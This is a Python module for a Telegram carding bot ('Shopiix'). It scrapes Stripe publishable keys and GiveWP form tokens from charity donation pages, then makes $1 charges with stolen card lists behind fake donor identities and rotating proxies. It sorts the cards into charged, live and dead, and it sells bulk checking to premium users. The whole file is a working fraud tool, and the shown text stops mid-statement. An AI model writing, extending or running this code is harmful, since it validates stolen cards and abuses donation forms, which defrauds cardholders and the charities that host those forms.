import aiohttp
import asyncio
import json
import os
import random
import re
import time
import aiofiles
from telethon import events, Button

# ─── CONFIG ────────────────────────────────────────────────────────────────────
MAX_CARDS      = 50000
MAX_SITES      = 25
_SC_SITES_FILE = "stripe_charge_sites.json"
_sc_global_sites: list = []
_sc_data_cache:  dict  = {}  # {url: {pk, form_id, form_hash, nonce, ajax_url, account, form_url}}

UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
STRIPE_API = "https://api.stripe.com"

# ─── SITE STORAGE ──────────────────────────────────────────────────────────────
def _load_sc_sites():
    global _sc_global_sites
    try:
        with open(_SC_SITES_FILE) as f:
            data = json.load(f)
        _sc_global_sites = data.get('__global__', [])
    except Exception:
        _sc_global_sites = []

def _save_sc_sites():
    try:
        with open(_SC_SITES_FILE, 'w') as f:
            json.dump({'__global__': _sc_global_sites}, f)
    except Exception:
        pass

def _get_global_sc_sites():         return list(_sc_global_sites)

def _add_global_sc_site(url):
    if url not in _sc_global_sites:
        _sc_global_sites.append(url)
    _save_sc_sites()

def _remove_global_sc_site(idx):
    if 0 <= idx < len(_sc_global_sites):
        removed = _sc_global_sites.pop(idx)
        _sc_data_cache.pop(removed, None)
        _save_sc_sites()
        return removed
    return None

def _remove_global_sc_site_by_url(url):
    if url in _sc_global_sites:
        _sc_global_sites.remove(url)
        _sc_data_cache.pop(url, None)
        _save_sc_sites()
        return True
    return False

def _normalize_url(url):
    url = url.strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

# ─── HELPERS ───────────────────────────────────────────────────────────────────
def _parse_proxy(p):
    if not p: return None
    if '://' in p: return p
    parts = p.split(':')
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

def _extract_cc(text):
    pattern = re.compile(r'\b(\d{15,16})[|/,: ]+(\d{1,2})[|/,: ]+(\d{2,4})[|/,: ]+(\d{3,4})\b')
    seen, cards = set(), []
    for m in pattern.finditer(text):
        c = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if c not in seen:
            seen.add(c)
            cards.append(c)
    return cards

def _random_email():
    names = ['alex', 'john', 'mike', 'sara', 'david', 'emma', 'james', 'lisa', 'chris', 'anna']
    return random.choice(names) + str(random.randint(100, 9999)) + '@gmail.com'

def _random_name():
    first = random.choice(['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
                           'Mary', 'Patricia', 'Jennifer', 'Linda', 'Barbara', 'Susan'])
    last  = random.choice(['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia',
                           'Miller', 'Davis', 'Wilson', 'Anderson', 'Taylor', 'Thomas'])
    return first, last

# ─── PAGE DATA EXTRACTION (GiveWP + Stripe) ───────────────────────────────────
def _parse_givewp_stripe(html: str):
    """Extract GiveWP + Stripe payment data from donation page HTML."""
    # Stripe publishable key
    pk = ''
    m = re.search(r'"publishable_key"\s*:\s*"(pk_live_[A-Za-z0-9]+)"', html)
    if not m:
        m = re.search(r'data-publishable-key=["\']?(pk_live_[A-Za-z0-9]+)["\']?', html)
    if not m:
        m = re.search(r'(pk_live_[A-Za-z0-9]{20,})', html)
    if m:
        pk = m.group(1)

    if not pk:
        return None

    # AJAX URL
    ajax_url = ''
    m = re.search(r'"ajaxurl"\s*:\s*"([^"]+)"', html)
    if m:
        ajax_url = m.group(1).replace('\\/', '/')
    if not ajax_url:
        m = re.search(r'"ajax_url"\s*:\s*"([^"]+)"', html)
        if m:
            ajax_url = m.group(1).replace('\\/', '/')

    # Form ID
    form_id = ''
    m = re.search(r'<input[^>]+name=["\']give-form-id["\'][^>]+value=["\'](\d+)["\']', html)
    if not m:
        m = re.search(r'data-id=["\'](\d+)-\d+["\']', html)
    if m:
        form_id = m.group(1)

    # Form hash
    form_hash = ''
    m = re.search(r'<input[^>]+name=["\']give-form-hash["\'][^>]+value=["\']([^"\']+)["\']', html)
    if m:
        form_hash = m.group(1)

    # Checkout nonce
    nonce = ''
    m = re.search(r'"checkout_nonce"\s*:\s*"([a-f0-9]+)"', html)
    if m:
        nonce = m.group(1)

    # Stripe connected account
    account = ''
    m = re.search(r'data-account=["\']([^"\']+)["\']', html)
    if m:
        account = m.group(1)

    # Form URL (action)
    form_url = ''
    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html)
    if m:
        form_url = m.group(1).replace('&amp;', '&')
    if not form_url:
        # fallback: base URL from ajaxurl
        if ajax_url:
            form_url = ajax_url.replace('/wp-admin/admin-ajax.php', '/donate/')

    # Form title
    title = ''
    m = re.search(r'<input[^>]+name=["\']give-form-title["\'][^>]+value=["\']([^"\']*)["\']', html)
    if m:
        title = m.group(1)

    if not form_id or not ajax_url:
        return None

    return {
        'pk':         pk,
        'form_id':    form_id,
        'form_hash':  form_hash,
        'nonce':      nonce,
        'ajax_url':   ajax_url,
        'account':    account,
        'form_url':   form_url,
        'form_title': title,
        'fetched_at': int(time.time()),
    }

async def _get_site_data(site, proxy=None):
    """Fetch and cache site data. Always tries direct first, proxy as fallback."""
    # Re-fetch if cached nonce is older than 20 hours
    cached = _sc_data_cache.get(site)
    if cached and (int(time.time()) - cached.get('fetched_at', 0)) < 72000:
        return cached

    hdrs = {
        'User-Agent':      UA,
        'Accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
    }

    async def _fetch(use_proxy):
        connector = aiohttp.TCPConnector(ssl=False)
        try:
            async with aiohttp.ClientSession(headers=hdrs, connector=connector) as sess:
                async with sess.get(site, proxy=use_proxy,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True) as resp:
                    return await resp.text(errors='ignore')
        except Exception:
            return None
        finally:
            await connector.close()

    html = await _fetch(None)
    info = _parse_givewp_stripe(html) if html else None

    if not info and proxy:
        html = await _fetch(proxy)
        info = _parse_givewp_stripe(html) if html else None

    if info:
        _sc_data_cache[site] = info
    return info

# ─── CORE CHECKER ──────────────────────────────────────────────────────────────
_LIVE_REASONS  = {
    'insufficient_funds', 'card_velocity_exceeded', 'do_not_honor',
    'not_permitted', 'restricted_card', 'security_violation',
    'transaction_not_permitted', 'incorrect_cvc',
}
_DEAD_REASONS  = {
    'incorrect_number', 'invalid_number', 'invalid_expiry_month',
    'invalid_expiry_year', 'expired_card', 'card_not_supported',
    'currency_not_supported',
}
_LIVE_KEYWORDS = ['insufficient', 'do not honor', 'not permitted',
                  'restricted', 'security violation', 'transaction limit', 'cvv', 'cvc']
_DEAD_KEYWORDS = ['invalid number', 'invalid card', 'invalid expiry', 'expired',
                  'card number is incorrect', 'number is not a valid']

async def stripe_charge_check(card: str, site: str, site_data: dict, proxy_str=None):
    p = card.strip().split('|')
    if len(p) != 4:
        return {'status': 'Error', 'message': 'Invalid format', 'card': card}

    cc, mm, yy, cvv = p
    yy    = ('20' + yy) if len(yy) == 2 else yy
    proxy = _parse_proxy(proxy_str)

    pk        = site_data['pk']
    form_id   = site_data['form_id']
    form_hash = site_data['form_hash']
    nonce     = site_data['nonce']
    ajax_url  = site_data['ajax_url']
    account   = site_data.get('account', '')
    form_url  = site_data.get('form_url', site)
    form_title = site_data.get('form_title', '')

    first, last = _random_name()
    email       = _random_email()

    connector = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(connector=connector) as s:

            # ── Step 1: Create Stripe PaymentMethod ──────────────────────────
            async with s.post(
                f'{STRIPE_API}/v1/payment_methods',
                data={
                    'type':                       'card',
                    'card[number]':               cc,
                    'card[exp_month]':            mm.zfill(2),
                    'card[exp_year]':             yy,
                    'card[cvc]':                  cvv,
                    'billing_details[name]':      f'{first} {last}',
                    'billing_details[email]':     email,
                    'billing_details[address][country]': 'US',
                },
                headers={
                    'Authorization':  f'Bearer {pk}',
                    'Content-Type':   'application/x-www-form-urlencoded',
                    'User-Agent':     UA,
                    'Origin':         'https://js.stripe.com',
                    'Referer':        'https://js.stripe.com/',
                },
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=20)
            ) as r:
                pm_resp = await r.json(content_type=None)

            if 'error' in pm_resp:
                err   = pm_resp['error']
                code  = err.get('code', '')
                msg   = err.get('message', '').strip()
                if code in _DEAD_REASONS or any(k in msg.lower() for k in _DEAD_KEYWORDS):
                    return {'status': 'Dead', 'message': msg or code, 'card': card}
                if code in _LIVE_REASONS or any(k in msg.lower() for k in _LIVE_KEYWORDS):
                    return {'status': 'Live', 'message': msg or code, 'card': card}
                return {'status': 'Dead', 'message': msg or code or 'Declined', 'card': card}

            pm_id = pm_resp.get('id', '')
            if not pm_id:
                return {'status': 'Error', 'message': 'No payment method ID', 'card': card}

            # ── Step 2: Submit donation to GiveWP ────────────────────────────
            post_data = {
                'action':                    'give_process_donation',
                'give-form-id':              form_id,
                'give-form-hash':            form_hash,
                'give-form-title':           form_title,
                'give-current-url':          form_url,
                'give-form-url':             form_url,
                'give-form-minimum':         '0.00',
                'give-form-maximum':         '100000.00',
                'give-price-id':             'custom',
                'give_amount':               '1.00',
                'give_first':                first,
                'give_last':                 last,
                'give_email':                email,
                'give_title':                '',
                'give_company_name':         '',
                'card_address':              '',
                'card_address_2':            '',
                'card_city':                 '',
                'card_state':                '',
                'card_zip':                  '10001',
                'card_country':              'US',
                'payment-mode':              'stripe',
                'give_stripe_payment_method': pm_id,
                'give-checkout-nonce':       nonce,
                '_give_is_donation_recurring': '0',
            }
            if account:
                post_data['give_stripe_account'] = account

            async with s.post(
                ajax_url,
                data=post_data,
                headers={
                    'User-Agent':  UA,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin':      site,
                    'Referer':     form_url or site,
                    'X-Requested-With': 'XMLHttpRequest',
                },
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as r:
                resp_text = await r.text(errors='ignore')

            # ── Step 3: Parse response ────────────────────────────────────────
            try:
                resp = json.loads(resp_text)
            except Exception:
                resp = {}

            if resp.get('success') is True:
                return {'status': 'Charged', 'message': 'Payment successful', 'card': card}

            # Extract error from GiveWP response
            err_msg = ''
            data_part = resp.get('data', {})
            if isinstance(data_part, dict):
                err_msg = (data_part.get('error') or data_part.get('message') or
                           data_part.get('exception') or '')
            elif isinstance(data_part, str):
                err_msg = data_part
            if not err_msg:
                err_msg = resp.get('message', '') or resp_text[:120]

            err_lower = err_msg.lower()

            # Check for 3DS redirect
            if any(k in err_lower for k in ['authentication', '3d secure', 'requires_action',
                                             'payment_intent', 'client_secret']):
                return {'status': 'Live', 'message': '3DS Required', 'card': card}

            if any(k in err_lower for k in _LIVE_KEYWORDS) or any(
                    r in err_lower for r in _LIVE_REASONS):
                return {'status': 'Live', 'message': err_msg[:120], 'card': card}

            if any(k in err_lower for k in _DEAD_KEYWORDS) or any(
                    r in err_lower for r in _DEAD_REASONS):
                return {'status': 'Dead', 'message': err_msg[:120], 'card': card}

            return {'status': 'Dead', 'message': err_msg[:120] or 'Declined', 'card': card}

    except asyncio.TimeoutError:
        return {'status': 'Error', 'message': 'Timeout', 'card': card}
    except Exception as ex:
        return {'status': 'Error', 'message': str(ex)[:80], 'card': card}
    finally:
        await connector.close()

# ─── BOT HANDLERS ──────────────────────────────────────────────────────────────
def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):

    _load_sc_sites()

    # ── /scadd ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/scadd(\s|$)'))
    async def scadd_handler(event):
        user_id = event.sender_id
        if not is_owner_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly the owner can add sites.", parse_mode='html')
            return

        parts   = event.raw_text.split(maxsplit=1)
        url_raw = None

        if len(parts) >= 2:
            m = re.search(r'(https?://\S+)', parts[1])
            url_raw = m.group(1).rstrip('/') if m else parts[1].strip().split()[0]
        elif event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.text:
                m = re.search(r'https?://\S+', reply_msg.text)
                if m: url_raw = m.group(0).rstrip('/')

        if not url_raw:
            await event.reply(
                "❌ <b>Usage:</b>\n"
                "▸ <code>/scadd https://example.org/donate/</code>\n\n"
                "<i>Supports GiveWP + Stripe donation sites.</i>",
                parse_mode='html'
            )
            return

        if len(_get_global_sc_sites()) >= MAX_SITES:
            await event.reply(f"❌ <b>Max {MAX_SITES} sites reached.</b>\nUse <code>/screm</code> first.", parse_mode='html')
            return

        url  = _normalize_url(url_raw)
        wait = await event.reply(
            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<i>Fetching site data...</i>",
            parse_mode='html'
        )

        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None
        info    = await _get_site_data(url, proxy)

        if info:
            _add_global_sc_site(url)
            sites = _get_global_sc_sites()
            await wait.edit(
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                f"✅  <b>𝗦𝗜𝗧𝗘  𝗔𝗗𝗗𝗘𝗗</b>  ✅\n"
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                f"🌐 <b>𝗦𝗜𝗧𝗘</b>    ▸  <code>{url}</code>\n"
                f"🔑 <b>𝗞𝗘𝗬</b>     ▸  <code>{info['pk'][:30]}...</code>\n"
                f"📋 <b>𝗙𝗢𝗥𝗠</b>    ▸  <code>{info['form_id']}</code>\n"
                f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>   ▸  {len(sites)} / {MAX_SITES} sites\n\n"
                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                parse_mode='html'
            )
        else:
            await wait.edit(
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                f"❌  <b>𝗡𝗢  𝗗𝗔𝗧𝗔  𝗙𝗢𝗨𝗡𝗗</b>  ❌\n"
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                f"🌐 <b>𝗦𝗜𝗧𝗘</b>  ▸  <code>{url}</code>\n\n"
                f"<i>Could not find GiveWP + Stripe data. Check the URL.</i>\n\n"
                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                parse_mode='html'
            )

    # ── /scaddtxt ──────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/scaddtxt(\s|$)'))
    async def scaddtxt_handler(event):
        user_id = event.sender_id
        if not is_owner_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly the owner can add sites.", parse_mode='html')
            return

        if not event.reply_to_msg_id:
            await event.reply("❌ Reply to a <b>.txt</b> file with <code>/scaddtxt</code>.", parse_mode='html')
            return

        reply_msg = await event.get_reply_message()
        if not reply_msg or not reply_msg.file or not (reply_msg.file.name or '').endswith('.txt'):
            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
            return

        wait = await event.reply(
            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<i>Reading file...</i>",
            parse_mode='html'
        )

        fp = await reply_msg.download_media()
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            os.remove(fp)
        except Exception:
            await wait.edit("❌ Could not read file.", parse_mode='html')
            return

        all_urls = list(dict.fromkeys([u.rstrip('/') for u in re.findall(r'https?://\S+', content)]))
        if not all_urls:
            await wait.edit("❌ No URLs found in file.", parse_mode='html')
            return

        proxies = load_proxies_fn(user_id)
        added, skipped, failed = [], [], []

        for url in all_urls:
            url = _normalize_url(url)
            sites_now = _get_global_sc_sites()
            if len(sites_now) >= MAX_SITES or url in sites_now:
                skipped.append(url)
                continue
            proxy = random.choice(proxies) if proxies else None
            info  = await _get_site_data(url, proxy)
            if info:
                _add_global_sc_site(url)
                added.append((url, info['form_id']))
            else:
                failed.append(url)

        total_now   = len(_get_global_sc_sites())
        added_lines = ''.join(f"✅ <code>{u}</code>  <i>Form:{f}</i>\n" for u, f in added[:10]) or '<i>None added</i>'
        skip_txt    = f"\n⚠️ <b>Skipped</b>  ▸  {len(skipped)}" if skipped else ''
        fail_txt    = f"\n❌ <b>Failed</b>   ▸  {len(failed)}" if failed else ''

        await wait.edit(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"✅  <b>𝗕𝗨𝗟𝗞  𝗔𝗗𝗗  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ✅\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"📋 <b>𝗙𝗢𝗨𝗡𝗗</b>   ▸  {len(all_urls)} URLs\n"
            f"✅ <b>𝗔𝗗𝗗𝗘𝗗</b>   ▸  {len(added)}\n"
            f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>   ▸  {total_now} / {MAX_SITES}{skip_txt}{fail_txt}\n\n"
            f"〔 ✅  A D D E D 〕\n<blockquote>{added_lines}</blockquote>\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /sclist ────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/sclist(\s|$)'))
    async def sclist_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return
        sites = _get_global_sc_sites()
        if not sites:
            await event.reply("❌ <b>No sites configured.</b>\n\nNo sites have been added yet. Contact the owner.", parse_mode='html')
            return
        lines = '\n'.join(
            f"<b>{i+1}.</b>  <code>{s}</code>"
            + (f"\n      🔑 <i>{_sc_data_cache[s]['pk'][:25]}...</i>" if s in _sc_data_cache else "")
            for i, s in enumerate(sites)
        )
        rem_note = "\n◈  Remove: <code>/screm &lt;number&gt;</code>" if is_owner_fn(user_id) else ""
        await event.reply(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"💳  <b>𝗦𝗧𝗥𝗜𝗣𝗘  𝗖𝗛𝗔𝗥𝗚𝗘  𝗦𝗜𝗧𝗘𝗦</b>  [ {len(sites)} / {MAX_SITES} ]\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"{lines}{rem_note}\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /screm ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/screm(\s|$)'))
    async def screm_handler(event):
        user_id = event.sender_id
        if not is_owner_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly the owner can remove sites.", parse_mode='html')
            return
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip().isdigit():
            await event.reply("❌ <b>Usage:</b> <code>/screm &lt;number&gt;</code>", parse_mode='html')
            return
        removed = _remove_global_sc_site(int(parts[1].strip()) - 1)
        if removed:
            await event.reply(f"🗑  <b>𝗦𝗜𝗧𝗘  𝗥𝗘𝗠𝗢𝗩𝗘𝗗</b>\n\n🌐 <code>{removed}</code>", parse_mode='html')
        else:
            await event.reply("❌ Invalid number. Use <code>/sclist</code> to check.", parse_mode='html')

    # ── /sc ────────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/sc(\s|$)'))
    async def sc_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return

        sites = _get_global_sc_sites()
        if not sites:
            await event.reply("❌ <b>No sites available.</b>\n\nNo sites configured yet. Contact the owner.", parse_mode='html')
            return

        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or parts[1].strip().count('|') != 3:
            await event.reply("❌ <b>Usage:</b> <code>/sc cc|mm|yy|cvv</code>", parse_mode='html')
            return

        card    = parts[1].strip()
        site    = random.choice(sites)
        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None

        info = _sc_data_cache.get(site) or await _get_site_data(site, proxy)
        if not info:
            await event.reply(f"❌ Cannot fetch data from <code>{site}</code>.", parse_mode='html')
            return

        status_msg = await event.reply(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<code>{card}</code>",
            parse_mode='html'
        )
        t0      = time.time()
        result  = await stripe_charge_check(card, site, info, proxy_str=proxy)
        elapsed = round(time.time() - t0, 2)

        status  = result['status']
        message = result['message']

        if status == 'Charged':
            s_emoji, s_text = '💎', '𝗖𝗛𝗔𝗥𝗚𝗘𝗗'
        elif status == 'Live':
            s_emoji, s_text = '🔥', '𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗'
        elif status == 'Dead':
            s_emoji, s_text = '❌', '𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗'
        else:
            s_emoji, s_text = '⚠️', '𝗘𝗥𝗥𝗢𝗥'

        await status_msg.edit(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"{s_emoji}  <b>{s_text}</b>  {s_emoji}\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>𝗖𝗔𝗥𝗗</b>   ▸  <code>{card}</code>\n"
            f"◈  <b>𝗥𝗘𝗦𝗣</b>   ▸  <i>{message[:120]}</i>\n"
            f"🌐 <b>𝗚𝗪</b>     ▸  Stripe Charge\n"
            f"⏱  <b>𝗧𝗜𝗠𝗘</b>  ▸  {elapsed}s\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /sctxt ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/sctxt(\s|$)'))
    async def sctxt_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
            return

        sites = _get_global_sc_sites()
        if not sites:
            await event.reply("❌ <b>No sites available.</b>\n\nNo sites configured yet. Contact the owner.", parse_mode='html')
            return

        if not event.reply_to_msg_id:
            await event.reply("❌ Reply to a <b>.txt</b> file with <code>/sctxt</code>.", parse_mode='html')
            return

        reply_msg = await event.get_reply_message()
        if not reply_msg or not reply_msg.file or not (reply_msg.file.name or '').endswith('.txt'):
            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
            return

        proxies = load_proxies_fn(user_id)
        for _s in list(sites):
            if _s not in _sc_data_cache:
                _p = random.choice(proxies) if proxies else None
                await _get_site_data(_s, _p)

        valid_sites = [s for s in sites if s in _sc_data_cache]
        if not valid_sites:
            await event.reply("❌ No valid sites available. Contact the owner to reconfigure.", parse_mode='html')
            return

        wait_msg = await event.reply("⏳ Reading file...", parse_mode='html')
        fp = await reply_msg.download_media()
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            os.remove(fp)
        except Exception:
            await wait_msg.edit("❌ Could not read file.", parse_mode='html')
            return

        cards = _extract_cc(content)
        if not cards:
            await wait_msg.edit("❌ No valid cards found in file.", parse_mode='html')
            return
        if not is_owner_fn(user_id) and len(cards) > MAX_CARDS:
            cards = cards[:MAX_CARDS]

        total   = len(cards)
        chat_id = event.chat_id
        results = {'charged': [], 'live': [], 'dead': [], 'error': 0, 'start': time.time()}
        _stop   = [False]

        await wait_msg.edit(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
            f"💳 <b>{total}</b> cards — Starting Stripe Charge...",
            parse_mode='html'
        )
        prog_msg = await event.respond(
            "⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
            parse_mode='html'
        )

        stop_key = f"sc_stop_{user_id}_{int(time.time())}".encode()

        async def _stop_handler(e):
            if e.sender_id == user_id and e.data == stop_key:
                _stop[0] = True
                await e.answer("⛔ Stopping...")

        bot.add_event_handler(_stop_handler, events.CallbackQuery())

        async def _update_prog(checked, last_card='', last_resp=''):
            elapsed  = int(time.time() - results['start'])
            h, rem   = divmod(elapsed, 3600)
            m_t, s_t = divmod(rem, 60)
            if last_card:
                num    = last_card.split('|')[0]
                masked = num[:6] + '*' * max(0, len(num)-10) + num[-4:] if len(num) > 10 else num
            else:
                masked = '—'
            resp_short = (last_resp[:26] + '...') if len(last_resp) > 28 else (last_resp or '—')
            buttons = [
                [Button.inline(f"💳  Card  →  {masked}",                         b"noop")],
                [Button.inline(f"📝  Response  →  {resp_short}",                  b"noop")],
                [Button.inline(f"💎  Charged  →  [ {len(results['charged'])} ]",  b"noop")],
                [Button.inline(f"🔥  Approve  →  [ {len(results['live'])} ]",     b"noop")],
                [Button.inline(f"❌  Decline  →  [ {len(results['dead'])} ]",     b"noop")],
                [Button.inline(f"⚠️  Errors   →  [ {results['error']} ]",         b"noop")],
                [Button.inline(f"✅  Progress  →  [ {checked} / {total} ]",       b"noop")],
                [Button.inline(f"⏱  Time  →  {h}h {m_t}m {s_t}s",               b"noop")],
                [Button.inline("⛔  Stop", stop_key)],
            ]
            try:
                await bot.edit_message(
                    chat_id, prog_msg.id,
                    "⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
                    buttons=buttons, parse_mode='html'
                )
            except Exception:
                pass

        semaphore     = asyncio.Semaphore(10)
        checked_count = [0]

        async def _check_one(card, idx):
            if _stop[0]: return
            async with semaphore:
                if _stop[0]: return
                try:
                    if not valid_sites:
                        results['error'] += 1
                        checked_count[0] += 1
                        return
                    site  = random.choice(valid_sites)
                    info  = _sc_data_cache[site]
                    proxy = random.choice(proxies) if proxies else None
                    res   = await stripe_charge_check(card, site, info, proxy_str=proxy)
                    st    = res['status']
                    msg   = res['message']
                    if st == 'Charged': results['charged'].append(res)
                    elif st == 'Live':  results['live'].append(res)
                    elif st == 'Error': results['error'] += 1
                    else:               results['dead'].append(res)
                    checked_count[0] += 1
                    if checked_count[0] % 5 == 0 or checked_count[0] == total:
                        await _update_prog(checked_count[0], card, msg)
                except Exception:
                    results['error'] += 1
                    checked_count[0] += 1

        await asyncio.gather(*[_check_one(c, i+1) for i, c in enumerate(cards)])
        bot.remove_event_handler(_stop_handler)

        elapsed  = int(time.time() - results['start'])
        h, rem   = divmod(elapsed, 3600)
        m_t, s_t = divmod(rem, 60)

        hits_txt = ''
        for r in results['charged'][:5]:
            hits_txt += f"💎 <code>{r['card']}</code>\n"
        for r in results['live'][:10]:
            hits_txt += f"🔥 <code>{r['card']}</code>\n"
        if not hits_txt:
            hits_txt = 'No hits found'

        summary = (
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"⚡  <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫  ·  𝗦𝗖𝗔𝗡  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ⚡\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>𝗧𝗢𝗧𝗔𝗟</b>    ▸  <code>{total}</code>\n"
            f"💎 <b>𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b>  ▸  <code>{len(results['charged'])}</code>\n"
            f"🔥 <b>𝗟𝗜𝗩𝗘</b>     ▸  <code>{len(results['live'])}</code>\n"
            f"❌ <b>𝗗𝗘𝗔𝗗</b>     ▸  <code>{len(results['dead'])}</code>\n"
            f"⚠️ <b>𝗘𝗥𝗥𝗢𝗥𝗦</b>   ▸  <code>{results['error']}</code>\n"
            f"🌐 <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬</b>  ▸  Stripe Charge\n"
            f"⏱  <b>𝗧𝗜𝗠𝗘</b>    ▸  {h}h {m_t}m {s_t}s\n\n"
            f"〔 🎯  H I T S 〕\n<blockquote>{hits_txt}</blockquote>\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>'
        )
        try:
            await bot.edit_message(chat_id, prog_msg.id, summary, parse_mode='html')
        except Exception:
            await event.respond(summary, parse_mode='html')

        if is_owner_fn(user_id) and (results['charged'] or results['live']):
            hits_path = f"sc_hits_{user_id}_{int(time.time())}.txt"
            try:
                async with aiofiles.open(hits_path, 'w') as hf:
